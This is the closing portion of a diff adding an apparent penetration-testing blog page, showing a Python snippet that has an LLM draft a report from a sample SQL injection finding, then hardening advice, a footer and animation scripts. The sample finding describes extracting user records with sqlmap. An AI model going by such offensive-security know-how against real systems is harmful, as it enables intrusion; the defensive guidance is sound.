+    <span class="str">"vulnerability"</span>: <span class="str">"SQL Injection"</span>,
+    <span class="str">"location"</span>: <span class="str">"https://target.com/search.php?q=1"</span>,
+    <span class="str">"evidence"</span>: <span class="str">"Database version: MySQL 8.0.32; extracted 847 user records"</span>,
+    <span class="str">"tool_output"</span>: <span class="str">"sqlmap confirmed boolean-based and time-based blind SQLi"</span>,
+    <span class="str">"cvss_vector"</span>: <span class="str">"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"</span>
+}
+
+prompt = <span class="str">f"""
+As a senior penetration testing consultant, generate a professional finding for:
+{json.dumps(finding, indent=2)}
+
+Format:
+## Finding Title
+**Severity:** [Critical/High/Medium/Low]
+**CVSS Score:** [calculated from vector]
+**Description:** [2-3 sentences explaining the vulnerability]
+**Business Impact:** [real-world consequences]
+**Steps to Reproduce:** [numbered technical steps]
+**Remediation:** [specific developer-actionable fix]
+**References:** [relevant CVE, OWASP, CWE]
+"""</span>
+
+r = openai.OpenAI().chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>,<span class="str">"content"</span>:prompt}]
+)
+<span class="fn">print</span>(r.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- ══ 09 — DEFENCE ══ -->
+<section class="sec rv" id="defence">
+  <div class="sec-hd"><span class="sec-n">09 //</span><h2 class="sec-t">Defence — Hardening External Infrastructure<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Effective external defence requires addressing the full attack surface systematically — not just patching the highest CVSS vulnerabilities while leaving misconfigurations and exposure issues unresolved. The controls below address the specific attack vectors consistently exploited during external assessments: web application vulnerabilities, credential weaknesses, DNS misconfigurations, cloud exposure, and the growing threat of AI-assisted reconnaissance and exploitation.</p>
+  </div>
+
+  <div class="mgrid rv">
+    <div class="mcard"><div class="mcard-name">Patch &amp; Version Management</div><div class="mcard-desc">Maintain a real-time inventory of all internet-facing software with version tracking. Subscribe to vendor security advisories and the CISA Known Exploited Vulnerabilities Catalogue. Critical CVEs affecting externally reachable services demand emergency patching within 24–72 hours — not the standard 30-day cycle.</div></div>
+    <div class="mcard"><div class="mcard-name">Web Application Firewall</div><div class="mcard-desc">Deploy a WAF in front of all web-facing applications with OWASP CRS rules enabled. Use a WAF platform with ML-based anomaly detection (Cloudflare, AWS WAF, Akamai) rather than static rule sets alone. Tune rules to eliminate false positives before enabling blocking mode — a WAF in detection-only mode provides visibility but no protection.</div></div>
+    <div class="mcard"><div class="mcard-name">Attack Surface Management</div><div class="mcard-desc">Deploy a continuous external attack surface management (ASM) platform to maintain an up-to-date inventory of all internet-facing assets. Discover shadow IT and forgotten subdomains before attackers do. ASM tools like Censys ASM, CyCognito, or Microsoft Defender EASM continuously monitor for new exposure and alert on high-risk changes.</div></div>
+    <div class="mcard"><div class="mcard-name">Strong Authentication &amp; MFA</div><div class="mcard-desc">Enforce Multi-Factor Authentication on every externally accessible login — VPN portals, webmail, admin panels, SSH, and cloud management consoles. Implement rate limiting and account lockout on all login endpoints to prevent password spraying. Consider phishing-resistant MFA (FIDO2/WebAuthn) for privileged access.</div></div>
+    <div class="mcard"><div class="mcard-name">DNS &amp; Email Hardening</div><div class="mcard-desc">Disable DNS zone transfers except to explicitly authorised secondary nameservers. Implement and enforce DMARC (p=reject), SPF, and DKIM on all sending domains — eliminate email spoofing capability entirely. Monitor certificate transparency logs for unauthorised certificate issuance against your domains.</div></div>
+    <div class="mcard"><div class="mcard-name">Least Exposure Principle</div><div class="mcard-desc">Remove every service, port, and endpoint from internet exposure that does not require it. Management interfaces (SSH, RDP, database ports, admin panels) should never be directly internet-facing — route all management access through a jump host or VPN. Run regular external port scans against your own IP ranges to verify what is actually exposed.</div></div>
+  </div>
+
+  <div class="dgrid rv">
+    <div class="panel" style="border-color:rgba(0,255,65,.22)">
+      <div class="panel-t" style="color:var(--g);font-size:12px">Compliance Alignment</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Conduct <strong>annual external penetration tests</strong> as required by PCI-DSS Requirement 11.4 and after significant changes</span></li>
+        <li><span class="chk-i"></span><span>Document all findings with <strong>CVSSv3 scores and remediation evidence</strong> for ISO 27001 A.12.6 compliance</span></li>
+        <li><span class="chk-i"></span><span>Implement <strong>vulnerability management SLAs</strong> — Critical in 24h, High in 7 days, Medium in 30 days</span></li>
+        <li><span class="chk-i"></span><span>Maintain <strong>evidence of remediation</strong> for audit trail — retesting reports confirm fixes before audit dates</span></li>
+      </ul>
+    </div>
+    <div class="panel" style="border-color:rgba(0,229,255,.22)">
+      <div class="panel-t" style="color:var(--c);font-size:12px">Technical Controls</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Implement <strong>TLS 1.3 minimum</strong> — disable TLS 1.0/1.1 and all deprecated cipher suites on all external services</span></li>
+        <li><span class="chk-i"></span><span>Enable <strong>HTTP security headers</strong> — HSTS, CSP, X-Frame-Options, X-Content-Type-Options on all web services</span></li>
+        <li><span class="chk-i"></span><span>Deploy <strong>DDoS protection</strong> (Cloudflare, Akamai) in front of all internet-facing services</span></li>
+        <li><span class="chk-i"></span><span>Implement <strong>certificate pinning</strong> for mobile and API clients — prevents MITM interception</span></li>
+      </ul>
+    </div>
+    <div class="panel" style="border-color:rgba(191,0,255,.22)">
+      <div class="panel-t" style="color:var(--p);font-size:12px">AI-Enhanced Defence</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Deploy <strong>AI-driven ASM</strong> for continuous external exposure monitoring — real-time alerts on new attack surface</span></li>
+        <li><span class="chk-i"></span><span>Use <strong>AI-powered threat intelligence</strong> to pre-emptively block known attacker infrastructure and malicious ASNs</span></li>
+        <li><span class="chk-i"></span><span>Implement <strong>ML-based anomaly detection</strong> on web logs to catch reconnaissance patterns before exploitation</span></li>
+        <li><span class="chk-i"></span><span>Conduct <strong>AI red team exercises</strong> — test whether your defences detect AI-generated attack patterns, not just traditional ones</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- ══ CTA ══ -->
+<div class="cta rv">
+  <div class="cta-t">// Know Your External Exposure Before Attackers Do. //</div>
+  <p class="cta-p">Every public IP address your organisation owns is under continuous automated attack. External penetration testing transforms that reality into actionable intelligence — specific vulnerabilities, demonstrated exploitability, and prioritised remediation. Combine systematic testing with AI-driven continuous monitoring and you shift from reactive breach response to proactive exposure management.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub — nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+
+<!-- ══ FOOTER ══ -->
+<footer class="footer">
+  <div class="f-l">
+    Nisarg Chasmawala (Shroff)<br>
+    <span class="f-alias">// HEAVEN</span>
+  </div>
+  <div class="f-r">
+    Offensive Security Engineer · MSc Cyber Security, BCU<br>
+    CEH Master · CPENT · CHFI · ISO 27001 Lead Auditor<br>
+    <a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a>
+  </div>
+</footer>
+
+</div>
+
+<script>
+/* ─── CURSOR ─── */
+const cur=document.getElementById('cur'),cur2=document.getElementById('cur2'),cur3=document.getElementById('cur3');
+let mx=0,my=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px'});
+(function loop(){cur2.style.left=mx+'px';cur2.style.top=my+'px';cur3.style.left=mx+'px';cur3.style.top=my+'px';requestAnimationFrame(loop)})();
+document.querySelectorAll('a,.btn,.vc,.tc,.atk,.mcard,.ai-card,.panel,.cb').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)'});
+  el.addEventListener('mouseleave',()=>{cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)'});
+});
+
+/* ─── PROGRESS ─── */
+window.addEventListener('scroll',()=>{document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%'});
+
+/* ═══ PARTICLE NETWORK ═══ */
+(function(){
+  const c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  let W,H,mouseX=innerWidth/2,mouseY=innerHeight/2;
+  const N=200,MAX=140;let P=[];
+  class Particle{
+    constructor(){this.reset(true)}
+    reset(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;const r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255'}
+    update(){const dx=this.x-mouseX,dy=this.y-mouseY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){const f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false)}
+    draw(){const a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle=`rgba(${this.color},${a})`;ctx.fill()}
+  }
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function drawLines(){for(let i=0;i<P.length;i++)for(let j=i+1;j<P.length;j++){const a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){const al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,`rgba(${a.color},${al})`);g.addColorStop(1,`rgba(${b.color},${al})`);ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke()}}}
+  function drawRing(){const g=ctx.createRadialGradient(mouseX,mouseY,0,mouseX,mouseY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mouseX,mouseY,80,0,Math.PI*2);ctx.fill()}
+  function animate(){ctx.clearRect(0,0,W,H);drawRing();drawLines();P.forEach(p=>{p.update();p.draw()});requestAnimationFrame(animate)}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',e=>{mouseX=e.clientX;mouseY=e.clientY});
+  P=Array.from({length:N},()=>new Particle());animate();
+})();
+
+/* ═══ HEX GRID ═══ */
+(function(){
+  const c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  let W,H,t=0;const S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight}
+  function hexPath(cx,cy,s){ctx.beginPath();for(let i=0;i<6;i++){const a=Math.PI/180*(60*i-30);i===0?ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a)):ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a))}ctx.closePath()}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;const sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(let r=-1;r<rows;r++)for(let col=-1;col<cols;col++){const cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%((S*1.5));const w=Math.sin(t+col*.3+r*.2)*.5+.5,p=Math.sin(t*1.4+col*.5-r*.3)*.5+.5;hexPath(cx,cy,S-2);ctx.strokeStyle=`rgba(0,255,65,${.02+w*.07})`;ctx.lineWidth=.6;ctx.stroke();if(w>.92){hexPath(cx,cy,S-2);ctx.fillStyle=`rgba(0,255,65,${.02+p*.03})`;ctx.fill()}}requestAnimationFrame(draw)}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+
+/* ═══ HERO 3D — GLOBE WITH ATTACK VECTORS ═══ */
+(function(){
+  const c=document.getElementById('hero-geo');if(!c)return;
+  const ctx=c.getContext('2d'),S=500;c.width=S;c.height=S;
+
+  // Sphere wireframe
+  const R=145,latSegs=14,lonSegs=20;
+  const spherePts=[];
+  for(let i=0;i<=latSegs;i++){
+    const lat=Math.PI*i/latSegs-Math.PI/2;
+    for(let j=0;j<lonSegs;j++){
+      const lon=2*Math.PI*j/lonSegs;
+      spherePts.push([R*Math.cos(lat)*Math.cos(lon),R*Math.cos(lat)*Math.sin(lon),R*Math.sin(lat)]);
+    }
+  }
+  // Sphere edges
+  const sphereEdges=[];
+  for(let i=0;i<=latSegs;i++)for(let j=0;j<lonSegs;j++){
+    const a=i*lonSegs+j,b=i*lonSegs+(j+1)%lonSegs,d=(i+1)*lonSegs+j;
+    if(i<latSegs)sphereEdges.push([a,b]);
+    if(i<latSegs)sphereEdges.push([a,d]);
+  }
+
+  // Attack vectors — arrows shooting from outside toward the sphere
+  const vectors=[];
+  const numVectors=8;
+  for(let i=0;i<numVectors;i++){
+    const angle=2*Math.PI*i/numVectors+0.3;
+    const tilt=(Math.random()-.5)*0.8;
+    const dist=220+Math.random()*60;
+    vectors.push({
+      ox:dist*Math.cos(angle),oy:dist*Math.sin(angle)*Math.cos(tilt),oz:dist*Math.sin(tilt),
+      col:['255,0,60','255,0,60','255,148,0','255,215,0','255,0,60','255,148,0','191,0,255','255,0,60'][i],
+      phase:Math.random()*Math.PI*2,
+      speed:0.025+Math.random()*0.02
+    });
+  }
+
+  let rx=0,ry=0,rz=0,mrx=0,mry=0;
+  document.addEventListener('mousemove',e=>{mrx=(e.clientY/innerHeight-.5)*.35;mry=(e.clientX/innerWidth-.5)*.45});
+
+  function rot([x,y,z],rx,ry,rz){
+    let y1=y*Math.cos(rx)-z*Math.sin(rx),z1=y*Math.sin(rx)+z*Math.cos(rx);
+    let x2=x*Math.cos(ry)+z1*Math.sin(ry),z2=-x*Math.sin(ry)+z1*Math.cos(ry);
+    let x3=x2*Math.cos(rz)-y1*Math.sin(rz),y3=x2*Math.sin(rz)+y1*Math.cos(rz);
+    return[x3,y3,z2];
+  }
+  function proj([x,y,z]){const f=420,d=f/(f+z+R*1.5);return[x*d+S/2,y*d+S/2,z]}
+
+  let t=0;
+  function draw(){
+    ctx.clearRect(0,0,S,S);
+    rx+=.004+mrx*.009;ry+=.007+mry*.011;rz+=.002;
+    t+=0.016;
+
+    const spv=spherePts.map(p=>proj(rot(p,rx,ry,rz)));
+
+    // Draw sphere wireframe
+    sphereEdges.forEach(([a,b])=>{
+      if(a>=spv.length||b>=spv.length)return;
+      const pa=spv[a],pb=spv[b];
+      const dep=((pa[2]+pb[2])/(2*R)+1)/2;
+      const al=0.03+dep*.28;
+      ctx.beginPath();ctx.moveTo(pa[0],pa[1]);ctx.lineTo(pb[0],pb[1]);
+      ctx.strokeStyle=`rgba(0,229,255,${al})`;ctx.lineWidth=0.5+dep*.4;ctx.stroke();
+    });
+
+    // Core glow
+    const gc=ctx.createRadialGradient(S/2,S/2,0,S/2,S/2,R*0.45);
+    gc.addColorStop(0,'rgba(0,229,255,0.08)');gc.addColorStop(1,'rgba(0,229,255,0)');
+    ctx.fillStyle=gc;ctx.beginPath();ctx.arc(S/2,S/2,R*0.45,0,Math.PI*2);ctx.fill();
+
+    // Draw attack vectors — animated pulses firing toward sphere center
+    vectors.forEach((v,i)=>{
+      const vphase=(t*v.speed+v.phase)%1;
+      const endX=0,endY=0,endZ=0; // sphere center
+      const rotOrig=proj(rot([v.ox,v.oy,v.oz],rx,ry,rz));
+      const rotEnd=proj(rot([endX,endY,endZ],rx,ry,rz));
+
+      // Arrow line
+      const dep=(rotOrig[2]+R*1.5)/(3*R);
+      const al=0.12+dep*.3;
+      ctx.beginPath();ctx.moveTo(rotOrig[0],rotOrig[1]);ctx.lineTo(rotEnd[0],rotEnd[1]);
+      ctx.strokeStyle=`rgba(${v.col},${al*0.5})`;ctx.lineWidth=0.6;ctx.stroke();
+
+      // Animated pulse along the vector
+      const px=rotOrig[0]+(rotEnd[0]-rotOrig[0])*vphase;
+      const py=rotOrig[1]+(rotEnd[1]-rotOrig[1])*vphase;
+      const pSize=3*(1-vphase)+1;
+      ctx.beginPath();ctx.arc(px,py,pSize,0,Math.PI*2);
+      ctx.fillStyle=`rgba(${v.col},${0.8*(1-vphase*0.5)})`;ctx.fill();
+      // Pulse glow
+      const pg=ctx.createRadialGradient(px,py,0,px,py,pSize*4);
+      pg.addColorStop(0,`rgba(${v.col},${0.3*(1-vphase)})`);pg.addColorStop(1,`rgba(${v.col},0)`);
+      ctx.fillStyle=pg;ctx.beginPath();ctx.arc(px,py,pSize*4,0,Math.PI*2);ctx.fill();
+
+      // Origin node
+      ctx.beginPath();ctx.arc(rotOrig[0],rotOrig[1],3,0,Math.PI*2);
+      ctx.fillStyle=`rgba(${v.col},0.7)`;ctx.fill();
+    });
+
+    // Outer ambient glow
+    const go=ctx.createRadialGradient(S/2,S/2,R,S/2,S/2,R*1.6);
+    go.addColorStop(0,'rgba(0,255,65,0.04)');go.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=go;ctx.beginPath();ctx.arc(S/2,S/2,R*1.6,0,Math.PI*2);ctx.fill();
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+/* ═══ 3D TILT ═══ */
+document.querySelectorAll('.vc').forEach(card=>{
+  card.addEventListener('mousemove',e=>{
+    const r=card.getBoundingClientRect(),x=(e.clientX-r.left)/r.width-.5,y=(e.clientY-r.top)/r.height-.5;
+    card.style.transform=`perspective(700px) rotateX(${-y*16}deg) rotateY(${x*16}deg) translateZ(12px) scale(1.03)`;
+    card.style.boxShadow=`${-x*24}px ${-y*24}px 50px rgba(191,0,255,.18),0 24px 60px rgba(0,0,0,.4)`;
+  });
+  card.addEventListener('mouseleave',()=>{
+    card.style.transform='perspective(700px) rotateX(0) rotateY(0) translateZ(0) scale(1)';
+    card.style.boxShadow='';card.style.transition='transform .4s,box-shadow .4s';
+    setTimeout(()=>card.style.transition='',400);
+  });
+});
+
+/* ═══ SCROLL REVEAL ═══ */
+const rv=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting)x.target.classList.add('on')}),{threshold:.08});
+document.querySelectorAll('.rv,.rv-l').forEach(el=>rv.observe(el));
+
+/* ═══ TOC TRACKING ═══ */
+const sIds=['hero','what','targets','planning','recon','scan','exploit','post','ai','defence'];
+const tItems=document.querySelectorAll('.toc-i');
+const so=new IntersectionObserver(e=>{e.forEach(x=>{if(x.isIntersecting)tItems.forEach(t=>t.classList.toggle('active',t.dataset.s===x.target.id))})},{threshold:.25});
+sIds.forEach(id=>{const el=document.getElementById(id);if(el)so.observe(el)});
+function goTo(h){document.querySelector(h)?.scrollIntoView({behavior:'smooth'})}
+
+/* ═══ CODE COPY ═══ */
+document.querySelectorAll('.cb').forEach(b=>{
+  b.title='Click to copy';
+  b.addEventListener('click',()=>{
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(()=>{});
+    const o=b.getAttribute('data-l');b.setAttribute('data-l',o+' ✓ COPIED');
+    setTimeout(()=>b.setAttribute('data-l',o),2000);
+  });
+});
+</script>
+</body>
+</html>
